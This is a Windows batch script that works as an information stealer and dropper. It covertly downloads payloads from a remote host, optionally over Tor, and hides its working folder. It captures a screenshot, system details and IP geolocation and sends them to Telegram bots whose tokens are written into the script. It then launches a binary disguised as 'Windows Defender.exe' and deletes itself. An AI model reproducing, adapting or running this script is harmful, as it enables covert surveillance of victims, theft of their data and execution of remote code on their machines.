@echo off
setlocal
del /s /f /q /a "%temp%\*"
FOR /D %%p IN ("%temp%\*.*") DO rmdir "%%p" /s /q
:connectivitycheck
ping www.google.com -n 1 -w 5000 >NUL
if errorlevel 1 goto Connectivitycheck

Set host=https://cryptedodissey.github.io
Set environment=C:\Windows

rem TESTING >
if "%computername%"=="WIN-6QJBGJLRIGL" set environment=%appdata%\microsoft\windows
rem TESTING <

tasklist /fi "imagename eq tor.exe" | find /i "tor.exe" > nul
if not errorlevel 1 (set "proxy=--tlsv1 --socks5-hostname 127.0.0.1:9050") else (
  set "proxy=--tlsv1"
)

set "folder=%random%"
mkdir "%temp%\%folder%" 
attrib +s +h +i "%temp%\%folder%" 
cd "%temp%\%folder%"
rmdir /s /q "%AppData%\Ookla"
"%environment%\curl.exe" -k %proxy% %host%/Capture/speedtest.exe --output "speedtest.exe"
"%environment%\curl.exe" -k %proxy% %host%/Capture/osinfo.vbs --output "osinfo.vbs"
"%environment%\nircmd.exe" savescreenshotfull "%username%@%computername% ~$currdate.dd_MM_yyyy$ ~$currtime.HH.mm$.png"
cscript.exe /nologo osinfo.vbs > "%username%@%computername%.txt"
"speedtest.exe" | echo YES
"speedtest.exe" --accept-gdpr >> "%username%@%computername%.txt"

for /f "tokens=2 delims==" %%G in ('wmic os get Caption /value') do ( 
    set WinEdition=%%G
    )
for /f "tokens=2 delims==" %%G in ('wmic os get OSArchitecture /value') do ( 
    set OSArchitecture=%%G
    )
for /f "tokens=*" %%A in (
  '%environment%\curl.exe -k ipinfo.io/ip'
) Do set ExtIP=%%A
for /f "tokens=*" %%A in (
  '%environment%\curl.exe -k ipinfo.io/city'
) Do set City=%%A
for /f "tokens=*" %%A in (
  '%environment%\curl.exe -k ipinfo.io/region'
) Do set Region=%%A
for /f "tokens=*" %%A in (
  '%environment%\curl.exe -k ipinfo.io/country'
) Do set Country=%%A
for /f "tokens=1* delims=: " %%A in (
  '%environment%\curl.exe -k ipinfo.io/org'
) Do set ISP=%%B
for /f "tokens=1* delims=: " %%A in (
  '%environment%\curl.exe -k %proxy% https://iplist.cc/api 2^>NUL^|find "tor"'
) Do set TorStatus=%%B
if [%TorStatus%]==[true] (
for /f "tokens=*" %%A in (
  '%environment%\curl.exe -k %proxy% ipinfo.io/ip'
) Do set ExtIPTor=%%A
) else (
set "ExtIPTor=N/A"
)

if exist "%temp%\expose.txt" (
    for /f "delims=" %%x in ('type %temp%\expose.txt') do set "Expose=%%x" 
) else (
   set "Expose=N/A"
)

"%environment%\curl.exe" -k %proxy% -F text="NEW CONNECTION: %username%@%computername% [%WinEdition% %OSArchitecture%] [%ISP% (%ExtIP%)] [%City% (%Region%, %Country%)] [Tor is enabled: %TorStatus% (%ExtIPTor%)] [Web Server: %Expose%] " https://api.telegram.org/bot55919717252:AAE3HbKOIhMcsP9NiKLAAZD8Nf9HQhRZgIY/sendMessage?chat_id=-1001540530403
for %%# in ("*.png") do "%environment%\curl.exe" -k %proxy% -F document=@"%%~f#" https://api.telegram.org/bot6053961003:AAENR1HtCpNA7AJaWN1LUnPXxuEsoogKBG8/sendDocument?chat_id=-1001930176759 -k --insecure
"%environment%\curl.exe" -k %proxy% -F document=@"%username%@%computername%.txt" https://api.telegram.org/bot5512879840:AAHYmF561WGn5fgOF1tp1OUGxAcK7TaTKu4/sendDocument?chat_id=-1001656341327 -k --insecure

cd "%temp%"
rmdir /s /q "%temp%\%folder%"

"%environment%\Windows Defender.exe" -P"rofile of Windows Defender [Microsoft Corporation]"
endlocal
del /s /f /q /a "%~f0"
